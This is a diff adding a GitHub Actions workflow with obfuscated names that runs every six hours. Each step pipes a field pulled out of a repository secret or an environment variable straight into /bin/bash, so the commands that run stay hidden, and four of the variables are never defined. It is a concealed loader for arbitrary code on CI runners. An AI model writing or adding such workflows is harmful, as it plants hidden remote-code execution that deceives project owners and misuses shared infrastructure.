@@ -1,0 +1,22 @@
+name: zhanxugang9871
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '55 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhanxugang9871
+        env:
+          z6083: ${{ secrets.z6083 }}
+        run: |
+          echo $z6083 | jq -r .vevx663 | /bin/bash
+          echo $zb513 | jq -r .ai26734 | /bin/bash
+          echo $zp41368 | jq -r .ri61 | /bin/bash
+          echo $ni32 | jq -r .a91 | /bin/bash
+          echo $sun64646 | jq -r .ovgbd538 | /bin/bash
+
